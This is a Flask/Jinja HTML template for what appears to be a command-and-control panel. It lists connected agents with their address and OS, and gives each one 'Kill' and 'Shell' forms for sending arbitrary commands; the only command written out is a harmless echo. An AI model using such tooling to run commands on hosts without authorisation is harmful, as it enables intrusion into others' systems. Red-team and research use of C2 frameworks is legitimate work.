<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Home</title>
</head>
<body>
<h1>Agents</h1>

{% for uuid, agent in c2.agents.items() %}
    <div class="agent-card">
        <h3>Agent</h3>
        <span>{{ agent.uuid }}</span>
        <br>
        <span>{{ agent.address }}</span>
        <br>
        <span>{{ agent.os }}</span>
        <form method="POST" action="{{ url_for("kill_agent", uuid=uuid) }}">
            <input type="submit" value="Kill">
        </form>
        <form method="POST" action="{{ url_for("processes", uuid=uuid) }}">
            <input type="text" name="command" value="/bin/bash -c 'echo Hello world'">
            <input type="submit" value="Shell">
        </form>
    </div>
{% endfor %}

</body>
</html>
